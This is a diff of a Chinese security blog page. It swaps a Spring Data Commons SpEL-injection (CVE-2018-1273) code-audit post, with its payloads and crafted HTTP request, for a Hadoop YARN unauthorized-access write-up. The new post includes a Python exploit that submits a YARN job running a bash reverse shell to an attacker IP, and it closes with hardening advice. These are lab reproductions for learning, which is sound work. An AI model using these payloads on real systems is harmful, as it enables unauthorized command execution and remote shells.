@@ -13,7 +13,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>代码审计之Spring Data Commons RCE |  小透的少年江湖</title>
+      <title>Hadoop-YARN未授权访问 |  小透的少年江湖</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/haoyun.ico" />
@@ -58,7 +58,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-代码审计之Spring Data Commons RCE"
+  id="post-Hadoop-YARN未授权访问"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -69,7 +69,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  代码审计之Spring Data Commons RCE
+  Hadoop-YARN未授权访问
 </h1>
  
 
@@ -77,11 +77,11 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2022/04/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSpring%20Data%20Commons%20RCE/" class="article-date">
-  <time datetime="2022-04-06T01:56:28.000Z" itemprop="datePublished">2022-04-06</time>
+      <a href="/2022/04/20/Hadoop-YARN%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" class="article-date">
+  <time datetime="2022-04-20T01:56:28.000Z" itemprop="datePublished">2022-04-20</time>
 </a> 
   <div class="article-category">
-    <a class="article-category-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a> / <a class="article-category-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java/">java</a> / <a class="article-category-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java/Spring/">Spring</a>
+    <a class="article-category-link" href="/categories/Web%E6%BC%8F%E6%B4%9E/">Web漏洞</a> / <a class="article-category-link" href="/categories/Web%E6%BC%8F%E6%B4%9E/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/">Web应用漏洞</a> / <a class="article-category-link" href="/categories/Web%E6%BC%8F%E6%B4%9E/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Hadoop/">Hadoop</a>
   </div>
   
 <div class="word_count">
@@ -89,7 +89,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">1.3k</span>
+            <span class="post-count">702</span>
         </span>
     </span>
 
@@ -98,7 +98,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">6 分钟</span>
+            <span class="post-count">2 分钟</span>
         </span>
     </span>
 </div>
@@ -113,67 +113,45 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="代码审计之Spring-Data-Commons-RCE"><a href="#代码审计之Spring-Data-Commons-RCE" class="headerlink" title="代码审计之Spring Data Commons RCE"></a>代码审计之Spring Data Commons RCE</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Spring Data是一个用于简化数据库访问，并支持云服务的开源框架,包含Commons、Gemfire、JPA、JDBC、MongoDB等模块。此漏洞产生于Spring Data Commons组件，该组件为提供共享的基础框架，适合各个子项目使用，支持跨数据库持久化。</p>
-<p>该漏洞的成因是当用户在项目中利用了Sprng-Data的相关Web特性对输入参数进行自动匹配时会将用户提交的form表单和key值作为SpEL的执行内容，导致SpEL表达式注入漏洞。</p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>通过Git命令获取源码 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/spring-projects/spring-data-examples/</span><br></pre></td></tr></table></figure>
+  <h1 id="Hadoop-YARN未授权访问"><a href="#Hadoop-YARN未授权访问" class="headerlink" title="Hadoop-YARN未授权访问"></a>Hadoop-YARN未授权访问</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Hadoop是一个由Apache的分布式系统基础架构，用户可开发分布式程序，充分利用集群的威力进行高速运算和存储，实现了一个分布式文件系统（Hadoop Distributed File System）。</p>
+<p>其中HDFS组件有高容错性的特点，并且部署在低廉的（low-cost）硬件上即可提供高吞吐量（high throughput）来访问应用程序的数据。</p>
+<img src="/2022/04/20/Hadoop-YARN%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20220420105822011.png" class title="image-20220420105822011">
 
-<p>这里由于在2.0.5版本中拒绝使用了SpEl表达式，所以需要回退到一个较早且存在漏洞的版本</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard ec94079b8f2b1e66414f410d89003bd333fb6e7d</span><br></pre></td></tr></table></figure>
+<p>Apache Yarn（Yet Another Resource Negotiator的缩写）是hadoop集群资源管理器系统，Yarn从hadoop 2引入，最初是为了改善MapReduce的实现，但是它具有通用性，同样执行其他分布式计算模式。</p>
+<p>ApplicationMaster负责与scheduler协商合适的container，跟踪应用程序的状态，以及监控它们的进度，ApplicationMaster是协调集群中应用程序执行的进程。每个应用程序都有自己的ApplicationMaster，负责与ResourceManager协商资源（container）和NodeManager协同工作来执行和监控任务 。</p>
+<p>当一个ApplicationMaster启动后，会周期性的向resourcemanager发送心跳报告来确认其健康和所需的资源情况，在建好的需求模型中，ApplicationMaster在发往resourcemanager中的心跳信息中封装偏好和限制，在随后的心跳中，ApplicationMaster会对收到集群中特定节点上绑定了一定的资源的container的租约，根据Resourcemanager发来的container，ApplicationMaster可以更新它的执行计划以适应资源不足或者过剩，container可以动态的分配和释放资源。</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用Vulhub进行搭建</p>
+<img src="/2022/04/20/Hadoop-YARN%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20220420110521767.png" class title="image-20220420110521767">
 
-<p>![image-20220406115416611](代码审计之Spring Data Commons RCE&#x2F;image-20220406115416611.png)</p>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>Spring MVC框架会处理来自前端的页面的请求，并根据请求进行数据的封装，处理前端页面的请求暂不赘述，我们现在主要探讨对数据的封装处理，因为Spring Data Commons框架在做数据封装处理的时候产生了漏洞。</p>
-<p>由提交对比Commit信息，考研发现漏洞文件应为MapDataBinder.java中的setPropertyVlue方法，如下:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">public void setPropertyValue(String propertyName, @Nullable Object value) throws BeansException &#123;</span><br><span class="line">            if (!this.isWritableProperty(propertyName)) &#123;</span><br><span class="line">                throw new NotWritablePropertyException(this.type, propertyName);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                StandardEvaluationContext context = new StandardEvaluationContext();</span><br><span class="line">                context.addPropertyAccessor(new MapDataBinder.MapPropertyAccessor.PropertyTraversingMapAccessor(this.type, this.conversionService));</span><br><span class="line">                context.setTypeConverter(new StandardTypeConverter(this.conversionService));</span><br><span class="line">                context.setRootObject(this.map);</span><br><span class="line">                Expression expression = PARSER.parseExpression(propertyName);</span><br><span class="line">                PropertyPath leafProperty = this.getPropertyPath(propertyName).getLeafProperty();</span><br><span class="line">                TypeInformation&lt;?&gt; owningType = leafProperty.getOwningType();</span><br><span class="line">                TypeInformation&lt;?&gt; propertyType = leafProperty.getTypeInformation();</span><br><span class="line">                propertyType = propertyName.endsWith(&quot;]&quot;) ? propertyType.getActualType() : propertyType;</span><br><span class="line">                if (propertyType != null &amp;&amp; this.conversionRequired(value, propertyType.getType())) &#123;</span><br><span class="line">                    PropertyDescriptor descriptor = BeanUtils.getPropertyDescriptor(owningType.getType(), leafProperty.getSegment());</span><br><span class="line">                    if (descriptor == null) &#123;</span><br><span class="line">                        throw new IllegalStateException(String.format(&quot;Couldn&#x27;t find PropertyDescriptor for %s on %s!&quot;, leafProperty.getSegment(), owningType.getType()));</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    MethodParameter methodParameter = new MethodParameter(descriptor.getReadMethod(), -1);</span><br><span class="line">                    TypeDescriptor typeDescriptor = TypeDescriptor.nested(methodParameter, 0);</span><br><span class="line">                    if (typeDescriptor == null) &#123;</span><br><span class="line">                        throw new IllegalStateException(String.format(&quot;Couldn&#x27;t obtain type descriptor for method parameter %s!&quot;, methodParameter));</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    value = this.conversionService.convert(value, TypeDescriptor.forObject(value), typeDescriptor);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                expression.setValue(context, value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>浏览器访问<a target="_blank" rel="noopener" href="http://ip:8088/">http://ip:8088</a></p>
+<img src="/2022/04/20/Hadoop-YARN%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20220420110624008.png" class title="image-20220420110624008">
 
+<h2 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h2><p>通过REST API提交任务执行申请新的application:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v -X http://yourip:8088/ws/v1/cluster/apps/new-application</span><br></pre></td></tr></table></figure>
 
+<p>返回异常信息</p>
+<img src="/2022/04/20/Hadoop-YARN%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20220420110903627.png" class title="image-20220420110903627">
 
-<p>该方法首先通过isWritableProperty()函数校验propertyName参数 是否为Controller设置的Form映射对象中的成员变量。</p>
-<p>![image-20220406135207008](代码审计之Spring Data Commons RCE&#x2F;image-20220406135207008.png)</p>
-<p>![image-20220406135232464](代码审计之Spring Data Commons RCE&#x2F;image-20220406135232464.png)</p>
-<p>然后再实例化StandardEvaluationContext类</p>
-<p>![image-20220406135348825](代码审计之Spring Data Commons RCE&#x2F;image-20220406135348825.png)</p>
-<p>并通过调用PARSER.parseExpression()来设置需要解析的表达式</p>
-<p>![image-20220406135532192](代码审计之Spring Data Commons RCE&#x2F;image-20220406135532192.png)</p>
-<p>最后通过调用expression.setValue()对SpEL表达式进行解析</p>
-<p>![image-20220406135804188](代码审计之Spring Data Commons RCE&#x2F;image-20220406135804188.png)</p>
-<p>从上面我们可以知道想要执行任意SpEL表达式的话，首先就要知道isWritableProperty()方法是如何对参数进行校验的并且绕过器校验即可。</p>
-<p>继续跟进isWritableProperty()，可以看到关键代码如下:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public boolean isWritableProperty(String propertyName) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                return this.getPropertyPath(propertyName) != null;</span><br><span class="line">            &#125; catch (PropertyReferenceException var3) &#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<img src="/2022/04/20/Hadoop-YARN%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20220420111006307.png" class title="image-20220420111006307">
 
-<p>当getPropertyPath()返回值不为NULL时，直接对其执行return操作。跟进getPropertyPath()查看其逻辑，关键代码如下:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">private PropertyPath getPropertyPath(String propertyName) &#123;</span><br><span class="line">            String plainPropertyPath = propertyName.replaceAll(&quot;\\[.*?\\]&quot;, &quot;&quot;);</span><br><span class="line">            //正则匹配</span><br><span class="line">            return PropertyPath.from(plainPropertyPath, this.type);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>先以post请求访问&#x2F;ws&#x2F;v1&#x2F;cluster&#x2F;apps&#x2F;new-application，获取application-id</p>
+<img src="/2022/04/20/Hadoop-YARN%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20220420111413118.png" class title="image-20220420111413118">
 
-<p>首先将正则匹配的字符.?*\进行 替换为空 ，并判断剩下的内容是否为type的属性。这里的type则是在Controller处用到的用于接收参数的类。</p>
-<p>所以只需要利用这个类的某个字段来构造恶意的SpEL表达式，但直接使用如下payload是没有用的:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(java.lang.Runtime).getRuntime().exec(&#x27;calc.exe&#x27;)</span><br></pre></td></tr></table></figure>
+<p>application-id为application_1650423858134_0001</p>
+<p>然后Post请求&#x2F;ws&#x2F;v1&#x2F;cluster&#x2F;apps,设置application-id和command命令，发送请求。</p>
+<img src="/2022/04/20/Hadoop-YARN%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20220420113354614.png" class title="image-20220420113354614">
 
-<p>由于在某些版本中添加了用来拒绝SpEL表达式的关键语句，所以需要使用反射来构造payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&#x27;calc.exe&#x27;)</span><br></pre></td></tr></table></figure>
+<p><strong>exp</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">target = &#x27;http://192.168.211.132:8088/&#x27;#hodoop目标地址</span><br><span class="line">lhost = &#x27;192.168.211.132&#x27; # 攻击方的IP地址</span><br><span class="line"></span><br><span class="line">url = target + &#x27;ws/v1/cluster/apps/new-application&#x27;</span><br><span class="line">resp = requests.post(url)</span><br><span class="line">app_id = resp.json()[&#x27;application-id&#x27;]</span><br><span class="line">url = target + &#x27;ws/v1/cluster/apps&#x27;</span><br><span class="line">data = &#123;</span><br><span class="line">    &#x27;application-id&#x27;: app_id,</span><br><span class="line">    &#x27;application-name&#x27;: &#x27;get-shell&#x27;,</span><br><span class="line">    &#x27;am-container-spec&#x27;: &#123;</span><br><span class="line">        &#x27;commands&#x27;: &#123;</span><br><span class="line">            &#x27;command&#x27;: &#x27;/bin/bash -i &gt;&amp; /dev/tcp/%s/1234 0&gt;&amp;1&#x27; % lhost,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#x27;application-type&#x27;: &#x27;YARN&#x27;,</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url, json=data)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>反弹shell成功，执行命令。</p>
+<img src="/2022/04/20/Hadoop-YARN%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20220420112523630.png" class title="image-20220420112523630">
 
 
 
-<p>成功构造pyload后便可寻找漏洞触发点，并对其进行测试，经过搜索可发现ProxyingHandlerMethodArgumentResolver.java中实例化了MapDataBinder对象，并调用了bind方法，将request.getParameterMap()作为参数，从前端获取传递过来的key-value的map类型的值</p>
-<p>![image-20220406142447929](代码审计之Spring Data Commons RCE&#x2F;image-20220406142447929.png)</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>运行spring boot项目</p>
-<p>![image-20220406145730359](代码审计之Spring Data Commons RCE&#x2F;image-20220406145730359.png)</p>
-<p>浏览器访问locahost:8080&#x2F;users&#x2F;</p>
-<p>![image-20220406145855003](代码审计之Spring Data Commons RCE&#x2F;image-20220406145855003.png)</p>
-<p>输入payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username%5B%23this.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22calc.exe%22%29%5D=xxxxxxx</span><br></pre></td></tr></table></figure>
-
-
-
-<p>构造数据请求</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /users HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: UM_distinctid=17d0947f1c862-0bbd9d1b4f56ea8-4c3e217e-1fa400-17d0947f1c9407; CNZZDATA1278069914=104780330-1636529643-%7C1636540572; __51uvsct__JGjrOr2rebvP6q2a=4; __51vcke__JGjrOr2rebvP6q2a=4c5322fc-092c-5527-b2a8-79802e8249c4; __51vuft__JGjrOr2rebvP6q2a=1636538257018</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 123</span><br><span class="line"></span><br><span class="line">username%5B%23this.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22calc.exe%22%29%5D=xxxxxxx</span><br></pre></td></tr></table></figure>
-
-
-
-<p>命令执行成功</p>
-<p>![image-20220406151302281](代码审计之Spring Data Commons RCE&#x2F;image-20220406151302281.png)</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://4ra1n.love/post/NeNCohaqp/">CVE-2018-1273分析 | 4ra1n</a></p>
-<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/45501896">从CVE-2018-1273学漏洞分析 - 知乎 (zhihu.com)</a></p>
-<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/news/321462">从CVE-2018-1273学漏洞分析 - 云+社区 - 腾讯云 (tencent.com)</a></p>
+<h2 id="防护建议"><a href="#防护建议" class="headerlink" title="防护建议"></a>防护建议</h2><p>1.建议项目拥有者将暴露在公网的服务<strong>端口（8040,8042,8088,50060,50070等）屏蔽掉，或做白名单访问处理。</strong></p>
+<p>2.<strong>对Hadoop web Manager服务（8088）做访问身份认证处理</strong>，对接收的数据包进行认证。</p>
+<p>3.<strong>修改默认端口</strong>，防止端口服务被批量利用。</p>
  
       <!-- reward -->
       
@@ -244,12 +222,12 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2022/04/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSpring%20Data%20Commons%20RCE/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2022/04/20/Hadoop-YARN%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" alt="微信分享二维码">
     </div>
 </div>
 
 <div id="share-mask"></div>  
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Spring-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">-代码审计 -Spring -命令执行</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web%E6%BC%8F%E6%B4%9E-Hadoop-YARN/" rel="tag">-web漏洞 - Hadoop -YARN</a></li></ul>
 
     </footer>
   </div>
@@ -257,19 +235,19 @@
    
   <nav class="article-nav">
     
-      <a href="/2022/04/20/Hadoop%20YARN%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" class="article-nav-link">
+      <a href="/2022/04/20/Dompdf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-nav-link">
         <strong class="article-nav-caption">上一篇</strong>
         <div class="article-nav-title">
           
-            Hadoop YARN未授权访问
+            Dompdf命令执行漏洞
           
         </div>
       </a>
     
     
-      <a href="/2022/04/02/CTF%E7%BB%83%E4%B9%A0-Reverse%E7%B3%BB%E5%88%97-HighwayHash64/" class="article-nav-link">
+      <a href="/2022/04/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSpring-Data-Commons-RCE/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">CTF练习-Reverse系列-HighwayHash64</div>
+        <div class="article-nav-title">代码审计之Spring-Data-Commons-RCE</div>
       </a>
     
   </nav>
